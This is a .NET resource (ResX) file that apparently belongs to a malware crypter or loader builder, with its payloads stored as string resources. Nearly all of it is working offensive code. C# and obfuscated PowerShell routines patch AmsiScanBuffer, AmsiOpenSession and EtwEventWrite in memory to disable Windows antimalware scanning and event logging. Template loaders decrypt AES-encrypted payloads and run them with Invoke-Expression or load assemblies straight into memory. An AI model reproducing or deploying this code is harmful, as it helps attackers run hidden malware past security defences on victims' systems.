<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="Patch" xml:space="preserve">
    <value>using System.Runtime.InteropServices;
using System;
using System.Text;
using System.Diagnostics;

namespace __Patch
{
    public class __Patcher
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibrary(string LiodermiaGranulater);

        public void PatchETW()
        {
            IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            var patch = getETWPayload();
            uint oldProtect;

            if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
                Console.WriteLine("[+] Successfully unhooked ETW!");
            }


        }
        public void PatchAMSI()
        {

            IntPtr amsiLibPtr = unProtect(getAMSILocation());
            if (amsiLibPtr != (IntPtr)0)
            {
                Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
                Console.WriteLine("[+] Successfully patched AMSI!");
            }
            else
            {
                Console.WriteLine("[!] Patching AMSI FAILED");
            }

        }
        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }
        private static IntPtr getAMSILocation()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
            LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }

        private static byte[] getETWPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }

        private static byte[] getAMSIPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }

        public static string Base64Decode(string base64EncodeData)
        {
            var base64bytes = Convert.FromBase64String(base64EncodeData);
            return Encoding.UTF8.GetString(base64bytes);
        }



        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -&gt; IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i &lt; NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }
        private static byte[] xorEncDec(byte[] inputData, string keyPhrase)
        {
            //byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase);
            byte[] bufferBytes = new byte[inputData.Length];
            for (int i = 0; i &lt; inputData.Length; i++)
            {
                bufferBytes[i] = (byte)(inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]);
            }
            return bufferBytes;
        }
    }
}</value>
  </data>
  <data name="PowershellPatch" xml:space="preserve">
    <value>$roflr = @"
using System;
using System.Runtime.InteropServices;
public class roflr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ccrvcj, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $roflr

$smoibhc = [roflr]::LoadLibrary("$(('ämsì.d'+'ll').normALIZe([char]([BytE]0x46)+[ChAr]([byTe]0x6f)+[cHAR]([Byte]0x72)+[cHAr]([Byte]0x6d)+[ChAR](27+41)) -replace [chaR](92+8-8)+[cHaR](108+4)+[ChaR]([Byte]0x7b)+[CHar](77+10-10)+[cHar]([bYtE]0x6e)+[cHar]([bytE]0x7d))")
$mqacvr = [roflr]::GetProcAddress($smoibhc, "$([cHaR]([BYtE]0x41)+[cHar](109)+[ChAr]([bYte]0x73)+[ChAR]([BYTE]0x69)+[char](83+56-56)+[ChAr](99+8-8)+[cHAR](97)+[CHAR]([bYte]0x6e)+[CHAr](23+43)+[cHAR]([BYtE]0x75)+[cHAR]([byTe]0x66)+[cHAr]([BYTe]0x66)+[cHar]([ByTe]0x65)+[cHAR]([ByTE]0x72))")
$p = 0
[roflr]::VirtualProtect($mqacvr, [uint32]5, 0x40, [ref]$p)
$dsag = "0xB8"
$viam = "0x57"
$nonk = "0x00"
$pewf = "0x07"
$yuhz = "0x80"
$qtod = "0xC3"
$oclox = [Byte[]] ($dsag,$viam,$nonk,$pewf,+$yuhz,+$qtod)
[System.Runtime.InteropServices.Marshal]::Copy($oclox, 0, $mqacvr, 6)</value>
  </data>
  <data name="PowershellPatchLoader" xml:space="preserve">
    <value>$encryptedBytes = [System.Convert]::FromBase64String("%CIPHER%")
$keyBase64 = "%THEKEY%"
$ivBase64 = "%THEIV%"
function DecryptAndRunPowerShellCode {
    param (
        [byte[]]$encryptedBytes,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $plainText = DecryptBytesToString $encryptedBytes $key $iv

        # Execute the decrypted PowerShell code
        Invoke-Expression $plainText
    } catch {
        Write-Error "Failed to decrypt and run PowerShell code: $($_.Exception.Message)"
    }
}

function DecryptBytesToString {
    param (
        [byte[]]$encryptedBytes,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $key
        $aes.IV = $iv

        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

        $memoryStream = New-Object System.IO.MemoryStream($encryptedBytes, 0, $encryptedBytes.Length)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $streamReader = New-Object System.IO.StreamReader($cryptoStream)
        $plainText = $streamReader.ReadToEnd()

        $streamReader.Dispose()
        $cryptoStream.Dispose()
        $memoryStream.Dispose()

        return $plainText
    } catch {
        Write-Error "Failed to decrypt bytes to string: $($_.Exception.Message)"
    }
}

# Base64-encoded key and IV obtained from the C# code
# Convert Base64-encoded key and IV to byte arrays
$key = [System.Convert]::FromBase64String($keyBase64)
$iv = [System.Convert]::FromBase64String($ivBase64)

# Call the decryption function to decrypt and run the PowerShell code
DecryptAndRunPowerShellCode $encryptedBytes $key $iv</value>
  </data>
  <data name="PowershellRunPe" xml:space="preserve">
    <value>$id = get-random
$code = @"
using System.Reflection;
using System.Threading;
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
namespace HelloWorld
{
    public class Program$id
    {
        // Implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


        public static void Main()
        {
            Patch.Patcher();
            byte[] data = DecryptAES(Convert.FromBase64String("%PAYLOADHERE%"),Convert.FromBase64String("%KEYHERE%"),Convert.FromBase64String("%IVHERE%"));
            Console.WriteLine("Loading From Memory...");
             var assembly = Assembly.Load(data);
MethodInfo method = assembly.EntryPoint;
if (method != null)
{
    // Get the parameters of the main method
    ParameterInfo[] parameters = method.GetParameters();

    // Check if the main method has parameters
    if (parameters.Length &gt; 0)
    {
        // Create an array to hold the arguments
        object[] args = new object[parameters.Length];

        // Set the values for the arguments based on their types
        for (int i = 0; i &lt; parameters.Length; i++)
        {
            if (parameters[i].ParameterType == typeof(string[]))
            {
                // If the parameter type is string[], pass an empty array
                args[i] = new string[] { };
            }
            else
            {
                // For other parameter types, pass null
                args[i] = null;
            }
        }

        // Invoke the main method with the arguments
        method.Invoke(null, args);
    }
    else
    {
        // If the main method has no parameters, invoke it with null arguments
        method.Invoke(null, null);
    }
}
        }
     
        public static byte[] DecryptAES(byte[] cipherText, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                 aes.KeySize = 128;
                 aes.BlockSize = 128;
                 aes.Padding = PaddingMode.Zeros;
                 aes.Key = key;
                 aes.IV = iv;

                 using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(cipherText, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
          public static Thread RunFromMemory(byte[] bytes)
        {
            var thread = new Thread(new ThreadStart(() =&gt;
            {
                var assembly = Assembly.Load(bytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {
                    string[] args = {};
                    method.Invoke(null, new object[] {args});
                }
            }));

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            return thread;
        }
    }


    class Patch 
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrLoadDll(IntPtr PathToFile, uint Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrUnloadDll(IntPtr ModuleHandle);
    
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint LdrGetProcedureAddress(IntPtr hModule, IntPtr ProcedureName, int ProcedureNumber, out IntPtr pFunction);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public uint Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public static void Patcher() 
        {
            int procId = Process.GetProcessesByName("Powershell")[0].Id;

            // Open the target process and get a handle to its memory
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = new IntPtr(procId);

            uint ntStatus = NtOpenProcess(out hProcess, 0x1F0FFF, ref oa, ref cid);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to open process: {0}", ntStatus);
                return;
            }

            // Load the amsi.dll library and obtain the address of the AmsiOpenSession function
            UNICODE_STRING ModuleFileName = new UNICODE_STRING();
            RtlInitUnicodeString(ref ModuleFileName, "amsi.dll");
            IntPtr hModule = IntPtr.Zero;

            ntStatus = LdrLoadDll(IntPtr.Zero, 0, ref ModuleFileName, out hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to load amsi.dll: {0}", ntStatus);
                NtClose(hProcess);
                return;
            }

            IntPtr pAmsiOpenSession = IntPtr.Zero;

            // Using an Ordinal 3 here as string was having an issue finding AmsiOpenSession
            ntStatus = LdrGetProcedureAddress(hModule, IntPtr.Zero, 3, out pAmsiOpenSession);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to find AmsiOpenSession function: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }
           
            // Modify the memory protection of the AmsiOpenSession function
            IntPtr protectionBase = pAmsiOpenSession;
            IntPtr regionSize = new IntPtr(1);
            uint oldProtect = 0;
            uint newProtect = 0x40;

            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, newProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to modify memory protection: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }

            // Write the patch to the AmsiOpenSession function
            byte[] patch = { 0x75 };
            uint bytesWritten = 0;

            ntStatus = NtWriteVirtualMemory(hProcess, pAmsiOpenSession + 0x03, patch, 1, out bytesWritten);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to write to process memory: {0}", ntStatus);
            }

            // Restore the original memory protection of the AmsiOpenSession function
            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, oldProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to restore memory protection: {0}", ntStatus);
            }

            Console.WriteLine("Amazing is Patched Have Fun!");

            // Unload the amsi.dll library
            ntStatus = LdrUnloadDll(hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to unload amsi.dll: {0}", ntStatus);
            }

            // Close the process handle
            ntStatus = NtClose(hProcess);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to close process handle: {0}", ntStatus);
            }

        }

    }
}
"@
$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp	
iex "[HelloWorld.Program$id]::Main()"</value>
  </data>
  <data name="PowershellRunPeLoader" xml:space="preserve">
    <value>$kmSoe=[System.Convert]::FromBase64String("%CIPHER%")
$bAseK64="%THEKEY%"
$jBZe64="%THEIV%"
function XpbygNPqLrDzG {
    param([byte[]]$kmSoe,[byte[]]$bAseK,[byte[]]$jBZe)
    try {
        $JmRTUe = DecryptBytesToString $kmSoe $bAseK $jBZe
        if (validateAndSanitizePowerShellCode $JmRTUe) {
            iex $JmRTUe
        } else {
            Write-Error "Failed to validate and sanitize PowerShell code"
        }
    } catch {
        Write-Error "Failed to decrypt and run PowerShell code: $($_.Exception.Message)"
    }
}

function validateAndSanitizePowerShellCode {
    param([string]$JmRTUe)
    try {
        [System.Management.Automation.Language.Parser]::ParseInput($JmRTUe, [ref]$null, [ref]$null)
        $sPGP = $JmRTUe -replace "Invoke-Expression", "" -replace "rm", ""
        return $sPGP
    } catch {
        Write-Error "Failed to validate and sanitize PowerShell code: $($_.Exception.Message)"
        return $null
    }
}

function DecryptBytesToString {
    param([byte[]]$kmSoe,[byte[]]$bAseK,[byte[]]$jBZe)
    try {
        $dbAes = New-Object System.Security.Cryptography.AesManaged
        $dbAes.Key = $bAseK
        $dbAes.IV = $jBZe
        $ycXgy = $dbAes.CreateDecryptor($dbAes.Key, $dbAes.IV)
        $emXjU = New-Object System.IO.MemoryStream($kmSoe, 0, $kmSoe.Length)
        $odWli = New-Object System.Security.Cryptography.CryptoStream($emXjU, $ycXgy, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $qxdmLRhJ = New-Object System.IO.StreamReader($odWli)
        $JmRTUe = $qxdmLRhJ.ReadToEnd()
        $qxdmLRhJ.Dispose()
        $odWli.Dispose()
        $emXjU.Dispose()
        return $JmRTUe
    } catch {
        Write-Error "Failed to decrypt bytes to string: $($_.Exception.Message)"
    }
}

$key = [System.Convert]::FromBase64String($bAseK64)
$iv = [System.Convert]::FromBase64String($jBZe64)
XpbygNPqLrDzG $kmSoe $key $iv</value>
  </data>
  <data name="RunPe" xml:space="preserve">
    <value>using System.Reflection;
using System;
using System.Runtime.InteropServices;
namespace __ScriptExecution
{
    public class __Executor
    {
        // Implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public void Run(byte[] payload)
        {
            var assembly = Assembly.Load(payload);
            MethodInfo method = assembly.EntryPoint;
            if (method != null)
            {
                // Get the parameters of the main method
                ParameterInfo[] parameters = method.GetParameters();

                // Check if the main method has parameters
                if (parameters.Length &gt; 0)
                {
                    // Create an array to hold the arguments
                    object[] args = new object[parameters.Length];

                    // Set the values for the arguments based on their types
                    for (int i = 0; i &lt; parameters.Length; i++)
                    {
                        if (parameters[i].ParameterType == typeof(string[]))
                        {
                            // If the parameter type is string[], pass an empty array
                            args[i] = new string[] { };
                        }
                        else
                        {
                            // For other parameter types, pass null
                            args[i] = null;
                        }
                    }

                    // Invoke the main method with the arguments
                    method.Invoke(null, args);
                }
                else
                {
                    // If the main method has no parameters, invoke it with null arguments
                    method.Invoke(null, null);
                }
            }
        }

    }

}</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="stub" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>Resources\stub.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
</root>